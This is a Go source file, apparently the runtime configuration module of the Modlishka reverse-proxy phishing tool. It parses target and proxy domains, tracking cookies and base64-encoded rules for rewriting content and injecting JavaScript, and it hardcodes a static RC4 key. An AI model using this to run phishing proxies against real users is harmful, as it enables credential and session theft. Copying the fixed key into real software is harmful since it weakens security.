package runtime

import (
	"encoding/base64"
	"log"
	"regexp"
	"strings"

	"github.com/drk1wi/Modlishka/config"
	"golang.org/x/net/publicsuffix"
)

// compiled regexp
var (
	RegexpUrl                            *regexp.Regexp
	RegexpSubdomainWithoutScheme         *regexp.Regexp
	RegexpPhishSubdomainUrlWithoutScheme *regexp.Regexp
	RegexpCookieTracking                 *regexp.Regexp
	RegexpSubdomain                      *regexp.Regexp
	RegexpFindSetCookie                  *regexp.Regexp
	RegexpSetCookie                      *regexp.Regexp
)

// runtime config
var (
	ProxyDomain    string
	TrackingCookie string
	TrackingParam  string

	TopLevelDomain string
	Target         string
	ProxyAddress   string

	ReplaceStrings         map[string]string
	JSInjectStrings        map[string]string
	TargetResources        []string
	TerminateTriggers      []string
	DynamicMode            bool
	ForceHTTPS             bool
	ForceHTTP              bool
	AllowSecureCookies     bool
	IgnoreTranslateDomains []string
	DisableDynamicSubdomains bool
	ReplacePathHosts       map[string]string

	StaticLocations []string

	//openssl rand -hex 32
	RC4_KEY = `1b293b681a3edbfe60dee4051e14eeb81b293b681a3edbfe60dee4051e14eeb8`
)

// Set up runtime core config
func SetCoreRuntimeConfig(conf config.Options) {

	Target = *conf.Target
	ProxyDomain = *conf.ProxyDomain
	ProxyAddress = *conf.ProxyAddress

	if len(*conf.TrackingCookie) > 0 {
		TrackingCookie = *conf.TrackingCookie
	}

	if len(*conf.TrackingParam) > 0 {
		TrackingParam = *conf.TrackingParam
	}

	domain, _ := publicsuffix.EffectiveTLDPlusOne(*conf.Target)
	TopLevelDomain = StripProtocol(domain)
	if Target != TopLevelDomain {
		TopLevelDomain = Target
	}

	if len(*conf.TargetRes) > 0 {
		TargetResources = strings.Split(string(*conf.TargetRes), ",")
	}

	if len(*conf.TerminateTriggers) != 0 {
		TerminateTriggers = strings.Split(string(*conf.TerminateTriggers), ",")
	}

	if len(*conf.StaticLocations) != 0 {
		StaticLocations = strings.Split(string(*conf.StaticLocations), ",")
	}

	if len(*conf.TargetRules) != 0 {
		ReplaceStrings = make(map[string]string)
		for _, val := range strings.Split(string(*conf.TargetRules), ",") {
			res := strings.Split(val, ":")
			decodedKey, err := base64.StdEncoding.DecodeString(res[0])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s . Terminating.", res[0])
			}

			decodedValue, err := base64.StdEncoding.DecodeString(res[1])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s . Terminating.", res[1])
			}

			ReplaceStrings[string(decodedKey)] = string(decodedValue)
		}
	}

	if len(*conf.JsRules) != 0 {
		JSInjectStrings = make(map[string]string)
		for _, val := range strings.Split(string(*conf.JsRules), ",") {
			res := strings.Split(val, ":")
			decoded, err := base64.StdEncoding.DecodeString(res[1])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s", res[1])
			}
			JSInjectStrings[res[0]] = string(decoded)
		}
	}

	if len(*conf.PathHostRules) != 0 {
		ReplacePathHosts = make(map[string]string)
		for _, val := range strings.Split(string(*conf.PathHostRules), ",") {
			res := strings.Split(val, ":")
			decodedKey := res[0]
			decodedValue := res[1]
			ReplacePathHosts[decodedKey] = decodedValue
		}
	}

	if len(*conf.IgnoreTranslateDomains) > 0 {
		IgnoreTranslateDomains = strings.Split(string(*conf.IgnoreTranslateDomains), ",")
	}

	DynamicMode = *conf.DynamicMode
	ForceHTTPS = *conf.ForceHTTPS
	ForceHTTP = *conf.ForceHTTP
	AllowSecureCookies = *conf.AllowSecureCookies
	DisableDynamicSubdomains = *conf.DisableDynamicSubdomains
}
